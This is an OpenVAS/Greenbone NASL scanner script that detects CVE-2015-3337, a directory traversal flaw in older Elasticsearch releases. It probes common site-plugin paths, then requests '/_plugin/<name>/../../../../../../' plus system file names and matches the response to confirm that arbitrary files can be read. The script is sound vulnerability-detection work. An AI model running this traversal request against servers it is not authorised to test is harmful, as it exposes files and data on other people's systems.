CPE = "cpe:/a:elastic:elasticsearch";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105265" );
	script_cve_id( "CVE-2015-3337" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Elasticsearch Directory Traversal Vulnerability" );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response" );
	script_tag( name: "insight", value: "Directory traversal vulnerability in Elasticsearch before 1.4.5 and 1.5.x before 1.5.2,
  when a site plugin is enabled, allows remote attackers to read arbitrary files." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "summary", value: "Elasticsearch is prone to a directory traversal vulnerability." );
	script_tag( name: "affected", value: "Elasticsearch before 1.4.5 and 1.5.x before 1.5.2." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-05-05 15:11:20 +0200 (Tue, 05 May 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_elastic_elasticsearch_detect_http.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 9200 );
	script_mandatory_keys( "elastic/elasticsearch/detected" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
files = traversal_files();
plugins = make_list( "test",
	 "kopf",
	 "HQ",
	 "marvel",
	 "bigdesk",
	 "head",
	 "paramedic",
	 "elasticsearch",
	 "git",
	 "jboss",
	 "log",
	 "tomcat",
	 "wiki" );
for plugin in plugins {
	url = "/_plugin/" + plugin + "/";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		check_plugin = plugin;
		break;
	}
}
if(check_plugin){
	for file in keys( files ) {
		url = "/_plugin/" + check_plugin + "/../../../../../../" + files[file];
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

